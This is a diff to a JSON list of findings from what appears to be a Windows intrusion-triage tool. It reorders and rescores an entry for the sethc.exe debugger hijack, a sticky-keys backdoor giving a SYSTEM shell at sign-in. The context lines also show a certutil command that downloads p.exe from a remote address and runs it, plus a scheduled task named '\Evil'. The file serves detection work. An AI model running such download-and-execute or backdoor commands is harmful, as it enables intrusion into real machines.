@@ -319,6 +319,19 @@
   "score": 80
  },
  {
+  "id": "C3",
+  "type": "command",
+  "command": "C:\\Windows\\System32\\cmd.exe",
+  "interpreter": "cmd.exe",
+  "presence": [
+   "debugger attached to \"sethc.exe\" (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe)"
+  ],
+  "signals": [
+   "runs instead of \"sethc.exe\", which Windows starts from the sign-in screen with SYSTEM rights"
+  ],
+  "score": 75
+ },
+ {
   "id": "E3",
   "type": "event",
   "title": "Scheduled task created: \\Evil",
@@ -355,7 +368,7 @@
   "score": 70
  },
  {
-  "id": "C3",
+  "id": "C4",
   "type": "command",
   "command": "cmd.exe /c \"certutil -urlcache -f http://198.51.100.4/p.exe %TEMP%\\p.exe & %TEMP%\\p.exe\"",
   "interpreter": "cmd.exe",
@@ -495,19 +508,6 @@
    "Remote Desktop sessions from Internet addresses"
   ],
   "score": 55
- },
- {
-  "id": "C4",
-  "type": "command",
-  "command": "C:\\Windows\\System32\\cmd.exe",
-  "interpreter": "cmd.exe",
-  "presence": [
-   "debugger attached to \"sethc.exe\" (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe)"
-  ],
-  "signals": [
-   "runs instead of \"sethc.exe\" every time that program is opened"
-  ],
-  "score": 50
  },
  {
   "id": "S5",
